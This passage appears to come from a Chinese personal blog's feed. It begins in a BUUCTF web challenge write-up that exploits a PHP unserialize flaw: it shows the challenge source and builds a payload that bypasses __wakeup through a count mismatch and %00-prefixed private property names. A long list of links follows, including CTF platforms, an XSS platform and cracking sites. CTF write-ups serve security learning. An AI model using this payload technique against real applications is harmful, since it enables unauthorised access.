operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>unserialize</code>很明显这是一个反序列化漏洞</p><p><code>echo $flag</code>条件是<code>username === 'admin' and password == 100</code></p><p>生成序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'100'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>    //得到O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了绕过<code>__wakeup</code>,执行<code>__destruct</code>,将2改成3，原理：变量个数大于原来的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" Name username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" Name password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意这里面有几个空格，把它换成%00，原理：私有变量前需要加个前缀0</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>select<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>site</title>
      <link href="/2021/03/08/site/"/>
      <url>/2021/03/08/site/</url>
      
        <content type="html"><![CDATA[<h1 id="Study-学习"><a href="#Study-学习" class="headerlink" title="Study_学习"></a>Study_学习</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>慕课（MOOC）</td><td><a href="https://www.icourse163.org/">https://www.icourse163.org/</a></td><td></td></tr><tr><td>安界网</td><td><a href="https://www.ajsafe.com/">https://www.ajsafe.com/</a></td><td></td></tr><tr><td>万门大学</td><td><a href="https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1">https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1</a></td><td></td></tr><tr><td>时宜搜书</td><td><a href="https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1">https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1</a></td><td></td></tr><tr><td>oeasy</td><td><a href="http://oeasy.org/">http://oeasy.org/</a></td><td></td></tr><tr><td>epubee电子书</td><td><a href="http://cn.epubee.com/books/">http://cn.epubee.com/books/</a></td><td></td></tr><tr><td>鸠摩搜书</td><td><a href="https://www.jiumodiary.com/">https://www.jiumodiary.com/</a></td><td></td></tr><tr><td>考试酷</td><td><a href="https://www.examcoo.com/index/ku">https://www.examcoo.com/index/ku</a></td><td></td></tr><tr><td>我要自学网</td><td><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></td><td></td></tr><tr><td>春秋</td><td><a href="https://www.ichunqiu.com/">https://www.ichunqiu.com/</a></td><td></td></tr><tr><td>简搜题</td><td><a href="https://www.jiansouti.com/">https://www.jiansouti.com/</a></td><td></td></tr><tr><td>网考网</td><td><a href="https://www.netkao.com/">https://www.netkao.com/</a></td><td></td></tr><tr><td>优学优考网</td><td><a href="http://www.yxykw.com/">http://www.yxykw.com/</a></td><td></td></tr></tbody></table><h1 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>CSDN</td><td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td><td></td></tr><tr><td>博客园</td><td><a href="https://www.cnblogs.com/">https://www.cnblogs.com/</a></td><td></td></tr><tr><td>GitHub</td><td><a href="https://github.com/">https://github.com/</a></td><td></td></tr><tr><td>菜鸟教程</td><td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td><td></td></tr><tr><td>吾爱破解</td><td><a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></td><td></td></tr><tr><td>stackoverflow</td><td><a href="https://stackoverflow.com/">https://stackoverflow.com/</a></td><td></td></tr><tr><td>w3school</td><td><a href="https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></td><td></td></tr><tr><td>C语言</td><td><a href="https://www.dotcpp.com/">https://www.dotcpp.com/</a></td><td></td></tr><tr><td>慕课网</td><td><a href="https://www.imooc.com/">https://www.imooc.com/</a></td><td></td></tr><tr><td>lib4dev</td><td><a href="http://www.lib4dev.in/">http://www.lib4dev.in/</a></td><td></td></tr><tr><td>掘金</td><td><a href="https://juejin.im/">https://juejin.im/</a></td><td></td></tr><tr><td>oschina</td><td><a href="https://www.oschina.net/?refresh">https://www.oschina.net/?refresh</a></td><td></td></tr><tr><td>老白（博客）</td><td><a href="https://oo0.bid/">https://oo0.bid/</a></td><td></td></tr><tr><td>资源素材站</td><td><a href="http://www.fxrcxjq.com/">http://www.fxrcxjq.com/</a></td><td></td></tr><tr><td>资源干货站</td><td><a href="http://xgp123.cn/">http://xgp123.cn/</a></td><td></td></tr><tr><td>MSDN</td><td><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></td><td></td></tr><tr><td>CTF</td><td><a href="https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/</a></td><td></td></tr><tr><td>CTF wiki</td><td><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a></td><td></td></tr><tr><td>黑吧安全网</td><td><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a></td><td></td></tr><tr><td>三叶草</td><td><a href="https://syc-2019--fxxy.repl.co/source/web.html">https://syc-2019--fxxy.repl.co/source/web.html</a></td><td></td></tr><tr><td>Go破解</td><td><a href="https://www.gopojie.net/">https://www.gopojie.net/</a></td><td></td></tr><tr><td>黑马程序员</td><td><a href="http://yun.itheima.com/">http://yun.itheima.com/</a></td><td></td></tr><tr><td>51cto</td><td><a href="https://edu.51cto.com/">https://edu.51cto.com/</a></td><td></td></tr><tr><td>脚本之家</td><td><a href="https://www.jb51.net/">https://www.jb51.net/</a></td><td></td></tr><tr><td>xss平台</td><td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td><td></td></tr><tr><td>sourceforge</td><td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td><td></td></tr><tr><td>md5</td><td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td><td></td></tr></tbody></table><h1 id="图库"><a href="#图库" class="headerlink" title="图库"></a>图库</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>wallhere</td><td><a href="https://wallhere.com/">https://wallhere.com/</a></td><td></td></tr><tr><td>konachan</td><td><a href="https://konachan.net/">https://konachan.net/</a></td><td></td></tr><tr><td>pixivic</td><td><a href="https://pixivic.com/?VNK=1671e864">https://pixivic.com/?VNK=1671e864</a></td><td></td></tr><tr><td>C站</td><td><a href="https://cosz.net/">https://cosz.net/</a></td><td></td></tr><tr><td>彼岸图库</td><td><a href="http://pic.netbian.com/">http://pic.netbian.com/</a></td><td></td></tr><tr><td>图虫</td><td><a href="https://tuchong.com/">https://tuchong.com/</a></td><td></td></tr><tr><td>电脑壁纸</td><td><a href="http://nav.6soluo.com/pic/">http://nav.6soluo.com/pic/</a></td><td></td></tr><tr><td>wallhaven</td><td><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></td><td></td></tr><tr><td>Pixiv</td><td><a href="https://m.pixivic.com/dailyRank?VNK=beec565f">https://m.pixivic.com/dailyRank?VNK=beec565f</a></td><td></td></tr><tr><td>wallpapercave</td><td><a href="https://wallpapercave.com/">https://wallpapercave.com/</a></td><td></td></tr><tr><td>千叶</td><td><a href="http://qianye88.com/">http://qianye88.com/</a></td><td></td></tr><tr><td>极简壁纸</td><td><a href="https://bz.zzzmh.cn/">https://bz.zzzmh.cn/</a></td><td></td></tr><tr><td>ACG</td><td><a href="https://2046xpro.com/">https://2046xpro.com/</a></td><td></td></tr><tr><td>图片</td><td><a href="https://www.mikuclub.org/">https://www.mikuclub.org/</a></td><td></td></tr><tr><td>壁次元</td><td><a href="https://www.biacgn.com/">https://www.biacgn.com/</a></td><td></td></tr><tr><td>大图库</td><td><a href="http://123.meibp.com/">http://123.meibp.com/</a></td><td></td></tr><tr><td>大叔心</td><td><a href="https://www.dashuxin.com/">https://www.dashuxin.com/</a></td><td></td></tr></tbody></table><h1 id="学校（）"><a href="#学校（）" class="headerlink" title="学校（）"></a>学校（）</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>ICC</td><td><a href="http://icc.hep.com.cn/getSystemDepartmentPortal.action">http://icc.hep.com.cn/getSystemDepartmentPortal.action</a></td><td></td></tr><tr><td>学习通（个人）</td><td><a href="http://i.chaoxing.com/">http://i.chaoxing.com/</a></td><td></td></tr><tr><td>学习通</td><td><a href="http://www.xuexi365.com/">http://www.xuexi365.com/</a></td><td></td></tr><tr><td>近代史</td><td><a href="https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html">https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html</a></td><td></td></tr><tr><td>WE learn</td><td><a href="https://course.sflep.com/">https://course.sflep.com/</a></td><td></td></tr><tr><td>智慧树</td><td><a href="https://www.zhihuishu.com/">https://www.zhihuishu.com/</a></td><td></td></tr><tr><td>雨课堂</td><td><a href="https://www.yuketang.cn/web">https://www.yuketang.cn/web</a></td><td></td></tr></tbody></table><h1 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>爱资料在线工具</td><td><a href="https://www.toolnb.com/">https://www.toolnb.com/</a></td><td></td></tr><tr><td>极简插件</td><td><a href="https://chrome.zzzmh.cn/">https://chrome.zzzmh.cn/</a></td><td></td></tr><tr><td>便捷工具</td><td><a href="https://shulijp.com/">https://shulijp.com/</a></td><td></td></tr><tr><td>蓝调</td><td><a href="http://www.lcoc.top/">http://www.lcoc.top/</a></td><td></td></tr><tr><td>短视频解析</td><td><a href="http://jx.xueshi.pro/">http://jx.xueshi.pro/</a></td><td></td></tr><tr><td>精准云工具</td><td><a href="https://jingzhunyun.com/">https://jingzhunyun.com/</a></td><td></td></tr><tr><td>搞定设计</td><td><a href="https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao">https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao</a></td><td></td></tr><tr><td>一个工具箱</td><td><a href="http://www.atoolbox.net/">http://www.atoolbox.net/</a></td><td></td></tr><tr><td>合集网</td><td><a href="http://www.heji.ltd/">http://www.heji.ltd/</a></td><td></td></tr><tr><td>创造者日报</td><td><a href="https://creatorsdaily.com/">https://creatorsdaily.com/</a></td><td></td></tr><tr><td>在线工具</td><td><a href="https://tool.lu/">https://tool.lu/</a></td><td></td></tr><tr><td>兔二工具箱</td><td><a href="https://www.tool22.com/">https://www.tool22.com/</a></td><td></td></tr></tbody></table><h1 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>优聚集</td><td><a href="https://ujuji.com/">https://ujuji.com/</a></td><td></td></tr><tr><td>KIM</td><td><a href="https://kim.plopco.com/">https://kim.plopco.com/</a></td><td></td></tr><tr><td>今日热榜</td><td><a href="https://tophub.today/c/ent">https://tophub.today/c/ent</a></td><td></td></tr><tr><td>AnyKnew</td><td><a href="https://www.anyknew.com/#/">https://www.anyknew.com/#/</a></td><td></td></tr><tr><td>牛导航</td><td><a href="http://www.ziliao6.com/">http://www.ziliao6.com/</a></td><td></td></tr><tr><td>沃克导航</td><td><a href="http://www.waysto.work/">http://www.waysto.work/</a></td><td></td></tr><tr><td>站长啦网站目录</td><td><a href="http://top.cnzzla.com/">http://top.cnzzla.com/</a></td><td></td></tr><tr><td>AnywhereAnything</td><td><a href="http://lackar.com/aa/">http://lackar.com/aa/</a></td><td></td></tr><tr><td>老司机导航</td><td><a href="http://www.giffox.com/">http://www.giffox.com/</a></td><td></td></tr><tr><td>广告创意文案</td><td><a href="https://www.addog.vip/">https://www.addog.vip/</a></td><td></td></tr><tr><td>产品经理导航</td><td><a href="https://dh.woshipm.com/#section-1">https://dh.woshipm.com/#section-1</a></td><td></td></tr><tr><td>考拉新媒体导航</td><td><a href="https://www.kaolamedia.com/">https://www.kaolamedia.com/</a></td><td></td></tr><tr><td>国外网站大全</td><td><a href="http://www.world68.com/">http://www.world68.com/</a></td><td></td></tr><tr><td>合集网</td><td><a href="https://www.heji.ltd/">https://www.heji.ltd/</a></td><td></td></tr><tr><td>龙轩</td><td><a href="http://ilxdh.com/">http://ilxdh.com/</a></td><td></td></tr><tr><td>小田田</td><td><a href="https://xydh.fun/xiaotiantian">https://xydh.fun/xiaotiantian</a></td><td></td></tr><tr><td>工具达人</td><td><a href="https://dartools.com/">https://dartools.com/</a></td><td></td></tr></tbody></table><h1 id="磁力"><a href="#磁力" class="headerlink" title="磁力"></a>磁力</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>小白种草</td><td><a href="https://wx.gzlpx.com.cn/">https://wx.gzlpx.com.cn/</a></td><td></td></tr><tr><td>超能搜</td><td><a href="http://www.chaonengsou.com/">http://www.chaonengsou.com/</a></td><td></td></tr><tr><td>罗马盘</td><td><a href="https://www.luomapan.com/">https://www.luomapan.com/</a></td><td></td></tr><tr><td>快搜</td><td><a href="https://search.chongbuluo.com/#nyaso">https://search.chongbuluo.com/#nyaso</a></td><td></td></tr><tr><td>酷搜</td><td><a href="https://www.kolsou.com/">https://www.kolsou.com/</a></td><td></td></tr><tr><td>优聚集</td><td><a href="http://hao.ujuji.com/#/">http://hao.ujuji.com/#/</a></td><td></td></tr><tr><td>小昭来啦</td><td><a href="https://www.xiaozhaolaila.com/">https://www.xiaozhaolaila.com/</a></td><td></td></tr><tr><td>小可搜搜</td><td><a href="https://www.xiaokesoso.com/">https://www.xiaokesoso.com/</a></td><td></td></tr><tr><td>大力盘</td><td><a href="https://www.dalipan.com/">https://www.dalipan.com/</a></td><td></td></tr><tr><td>尘心聚搜索</td><td><a href="https://pan.ischenxin.com/">https://pan.ischenxin.com/</a></td><td></td></tr><tr><td>西瓜搜</td><td><a href="http://www.xgsoso.com/">http://www.xgsoso.com/</a></td><td></td></tr><tr><td>蓝奏搜</td><td><a href="https://www.xqxianbao.com/lzys/">https://www.xqxianbao.com/lzys/</a></td><td></td></tr><tr><td>大圣盘</td><td><a href="https://www.dashengpan.com/">https://www.dashengpan.com/</a></td><td></td></tr><tr><td>云盘精灵</td><td><a href="https://www.yunpanjingling.com/">https://www.yunpanjingling.com/</a></td><td></td></tr><tr><td>云铺子</td><td><a href="http://www.yunpz.net/">http://www.yunpz.net/</a></td><td></td></tr><tr><td>呆河马</td><td><a href="http://www.daihema.com/">http://www.daihema.com/</a></td><td></td></tr><tr><td>盘天下</td><td><a href="https://www.pantianxia.com/">https://www.pantianxia.com/</a></td><td></td></tr><tr><td>小白盘</td><td><a href="https://www.xiaobaipan.com/">https://www.xiaobaipan.com/</a></td><td></td></tr><tr><td>易破解</td><td><a href="https://www.ypojie.com/">https://www.ypojie.com/</a></td><td></td></tr><tr><td>去转盘</td><td><a href="https://www.quzhuanpan.com/">https://www.quzhuanpan.com/</a></td><td></td></tr><tr><td>巴士搜索</td><td><a href="http://bashi5.org/">http://bashi5.org/</a></td><td></td></tr><tr><td>yamadie</td><td><a href="https://yamadie.net/">https://yamadie.net/</a></td><td></td></tr><tr><td>ttdva</td><td><a href="http://www.ttdva.com/">http://www.ttdva.com/</a></td><td></td></tr><tr><td>求资源</td><td><a href="https://www.qiuziyuan.net/">https://www.qiuziyuan.net/</a></td><td></td></tr><tr><td>阿萨姆软件</td><td><a href="https://www.sssam.com/">https://www.sssam.com/</a></td><td></td></tr><tr><td>大白软件站</td><td><a href="https://win.o--o.win/">https://win.o--o.win/</a></td><td></td></tr><tr><td>MT</td><td><a href="http://mt.indabai.com/">http://mt.indabai.com/</a></td><td></td></tr><tr><td>无解搜</td><td><a href="http://wujiesou.com/">http://wujiesou.com/</a></td><td></td></tr><tr><td>懒盘</td><td><a href="https://www.lzpan.com/">https://www.lzpan.com/</a></td><td></td></tr></tbody></table><h1 id="专业（企业）"><a href="#专业（企业）" class="headerlink" title="专业（企业）"></a>专业（企业）</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>华为云直播</td><td><a href="https://bbs.huaweicloud.com/webinar">https://bbs.huaweicloud.com/webinar</a></td><td></td></tr><tr><td>360网络安全学院</td><td><a href="https://university.360.cn/">https://university.360.cn/</a></td><td></td></tr><tr><td>华为高校系列</td><td><a href="https://huaweicloud.bugu.mudu.tv/watch/lm06j3em">https://huaweicloud.bugu.mudu.tv/watch/lm06j3em</a></td><td></td></tr><tr><td>阿里云开发社区</td><td><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></td><td></td></tr><tr><td>腾讯云</td><td><a href="https://cloud.tencent.com/">https://cloud.tencent.com/</a></td><td></td></tr><tr><td>腾讯云开发者手册</td><td><a href="https://cloud.tencent.com/developer/devdocs">https://cloud.tencent.com/developer/devdocs</a></td><td></td></tr></tbody></table><h1 id="办公"><a href="#办公" class="headerlink" title="办公"></a>办公</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>QQ邮箱</td><td><a href="https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f">https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f</a></td><td></td></tr><tr><td>吾道幻灯片</td><td><a href="https://www.woodo.cn/?f=2388">https://www.woodo.cn/?f=2388</a></td><td></td></tr><tr><td>uzer</td><td><a href="https://uzer.me/">https://uzer.me/</a></td><td></td></tr><tr><td>hippter（PPT）</td><td><a href="http://www.hippter.com/">http://www.hippter.com/</a></td><td></td></tr></tbody></table><h1 id="影视"><a href="#影视" class="headerlink" title="影视"></a>影视</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>片库</td><td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td><td></td></tr><tr><td>真不卡电影网</td><td><a href="https://www.zhenbuka.com/">https://www.zhenbuka.com/</a></td><td></td></tr><tr><td>电影雷达</td><td><a href="http://m.dianyingleida.com/">http://m.dianyingleida.com/</a></td><td></td></tr><tr><td>飘花影院</td><td><a href="http://www.phyy1.com/">http://www.phyy1.com/</a></td><td></td></tr><tr><td>学士爱解析</td><td><a href="http://jiexi.xueshi.pro/">http://jiexi.xueshi.pro/</a></td><td></td></tr><tr><td>聚BT</td><td><a href="https://jubt.net/cn/index.html">https://jubt.net/cn/index.html</a></td><td></td></tr><tr><td>动漫</td><td><a href="https://qinmei.video/">https://qinmei.video/</a></td><td></td></tr><tr><td>蛋蛋赞影院</td><td><a href="https://www.dandanzan.com/">https://www.dandanzan.com/</a></td><td></td></tr><tr><td>电影狗</td><td><a href="http://www.dianyinggou.com/linkNav/">http://www.dianyinggou.com/linkNav/</a></td><td></td></tr><tr><td>VIP</td><td><a href="http://vip.sb/">http://vip.sb/</a></td><td></td></tr></tbody></table><h1 id="文库下载"><a href="#文库下载" class="headerlink" title="文库下载"></a>文库下载</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>南瓜文档</td><td><a href="http://www.588230.com/#wenku">http://www.588230.com/#wenku</a></td><td></td></tr><tr><td>北斗百度文库下载</td><td><a href="http://www.bdwenku.com/">http://www.bdwenku.com/</a></td><td></td></tr></tbody></table><h1 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>哔哩哔哩</td><td><a href="https://www.bilibili.com/">https://www.bilibili.com/</a></td><td></td></tr><tr><td>微云</td><td><a href="https://www.weiyun.com/">https://www.weiyun.com/</a></td><td></td></tr><tr><td>百度云</td><td><a href="https://pan.baidu.com/">https://pan.baidu.com</a></td><td></td></tr><tr><td>蓝奏云</td><td><a href="https://lanzou.com/">https://lanzou.com/</a></td><td></td></tr><tr><td>知乎</td><td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td><td></td></tr><tr><td>虎牙</td><td><a href="https://www.huya.com/">https://www.huya.com/</a></td><td></td></tr></tbody></table><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>路过图床</td><td><a href="https://imgchr.com/">https://imgchr.com/</a></td><td></td></tr><tr><td>聚合图床</td><td><a href="https://www.superbed.cn/">https://www.superbed.cn/</a></td><td></td></tr><tr><td>油猴</td><td><a href="https://greasyfork.org/zh-CN">https://greasyfork.org/zh-CN</a></td><td></td></tr><tr><td>插件</td><td><a href="https://www.extfans.com/">https://www.extfans.com/</a></td><td></td></tr><tr><td>云短信</td><td><a href="https://www.materialtools.com/">https://www.materialtools.com/</a></td><td></td></tr><tr><td>临时邮箱</td><td><a href="https://10minutemail.net/">https://10minutemail.net/</a></td><td></td></tr><tr><td>云短信2</td><td><a href="https://yunduanxin.net/">https://yunduanxin.net/</a></td><td></td></tr><tr><td>PDF转</td><td><a href="https://www.cleverpdf.com/cn">https://www.cleverpdf.com/cn</a></td><td></td></tr><tr><td>PDF</td><td><a href="https://lightpdf.cn/">https://lightpdf.cn/</a></td><td></td></tr><tr><td>alltoall</td><td><a href="https://www.alltoall.net/">https://www.alltoall.net/</a></td><td></td></tr></tbody></table><h1 id="靶场-渗透"><a href="#靶场-渗透" class="headerlink" title="靶场  渗透"></a>靶场  渗透</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>i春秋</td><td><a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></td><td></td></tr><tr><td>攻防世界</td><td><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></td><td></td></tr><tr><td>Wechall</td><td><a href="http://www.wechall.net/">http://www.wechall.net/</a></td><td></td></tr><tr><td>Wargame</td><td><a href="http://www.wargame.kr/">http://www.wargame.kr/</a></td><td></td></tr><tr><td>渗透师</td><td><a href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></td><td></td></tr><tr><td>小迪渗透</td><td><a href="http://www.xiaodi8.com/">http://www.xiaodi8.com/</a></td><td></td></tr><tr><td>MD5</td><td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td><td></td></tr><tr><td>XSS平台</td><td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td><td></td></tr><tr><td>sourceforge</td><td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td><td></td></tr><tr><td>查IP</td><td><a href="https://site.ip138.com/raw.githubusercontent.com/">https://site.ip138.com/raw.githubusercontent.com/</a></td><td></td></tr><tr><td>BUUCTF</td><td><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr><tr><td>Bugku</td><td><a 